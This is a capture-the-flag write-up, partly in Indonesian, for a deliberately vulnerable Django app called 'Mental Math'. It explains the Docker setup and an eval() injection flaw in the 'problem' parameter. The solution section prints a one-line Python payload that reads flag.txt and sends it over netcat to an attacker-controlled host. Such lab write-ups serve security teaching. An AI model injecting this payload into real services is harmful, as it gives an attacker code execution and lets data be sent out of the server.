# Mental Math

## Description

My first web app, check it out! `localhost:8000`

### Setup Docker

[Download File](https://github.com/KelompokStudiLinux/WriteUp-CTF/raw/master/WEB/mentalmath/mentalmath.zip)

pada directory yang berisikan file `Dockerfile` atau `docker-compose.yml` jalankan:
1. `docker-compose up -d --build` untuk menjalankan container di background
2. `docker-compose down` untuk mematikan container

Note: will have to change `ALLOWED_HOSTS` in Django and the `UWSGI_ROUTE_HOST` environment variable in
the Dockerfile once we know where this will be hosted.

Also note that since we give arbitrary code execution, the server is restarted every five minutes.

## Documentation

A pretty simple Django Python `eval` vuln. The hard part is deducing that there may be an
`eval` present here, and also figuring out that this is a Django app. There is a comment
in one of the HTML files with leftover Django templating which serves as a hint. It teaches
participants how to think like an attacker in that the fact that the math problem
is sent over AJAX back to the server might mean it is being passed to an `eval`.

## Solution

The `problem` parameter to the endpoint `new_problem` is `eval()`ed. So one can send the following
in this parameter (and setup a listener on `<attacker-ip>` of course) to get the flag.
```python
__import__('os').popen('cat flag.txt | nc <attacker-ip> <attacker-port>')
```
